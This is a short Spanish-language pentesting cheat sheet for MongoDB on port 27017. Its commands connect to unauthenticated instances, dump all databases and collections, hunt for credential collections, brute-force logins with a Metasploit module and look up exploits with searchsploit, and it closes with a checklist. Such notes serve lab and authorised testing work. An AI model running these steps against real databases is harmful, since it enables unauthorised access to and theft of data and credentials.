# Enumeración y Ataque — MongoDB (Puerto 27017)

## Descripción

MongoDB es una base de datos NoSQL orientada a documentos. Por defecto en versiones antiguas **no requiere autenticación**, permitiendo acceso directo a todos los datos.

**Puerto por defecto:** 27017

---

## Paso 1 — Conexión directa (sin autenticación)

```shell
# Con mongosh (versiones modernas)
mongosh TARGET_IP

# Con mongo (versiones antiguas)
mongo TARGET_IP
```

---

## Paso 2 — Enumeración básica

```shell
# Listar bases de datos
show dbs

# Seleccionar base de datos
use nombre_db

# Listar colecciones (equivalente a tablas)
show collections

# Ver todos los documentos de una colección
db.nombre_coleccion.find()

# Ver de forma legible
db.nombre_coleccion.find().pretty()

# Buscar usuarios o contraseñas
db.users.find()
db.accounts.find()
db.credentials.find()
```

---

## Paso 3 — Buscar credenciales

```shell
# Buscar en todas las colecciones palabras clave
db.getCollectionNames().forEach(function(c) {
  db[c].find().forEach(function(d) { printjson(d) })
})
```

---

## Paso 4 — Con autenticación

```shell
mongo -u admin -p contraseña TARGET_IP/admin

# Fuerza bruta con Metasploit
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS TARGET_IP
run
```

---

## Paso 5 — Buscar versión vulnerable

```shell
searchsploit mongodb
```

---

## Checklist rápido

```
[ ] mongo TARGET_IP → ¿acceso sin credenciales?
[ ] show dbs → buscar bases de datos interesantes
[ ] db.users.find() / db.accounts.find() → buscar credenciales
[ ] Fuerza bruta si requiere autenticación
[ ] searchsploit con versión exacta
```
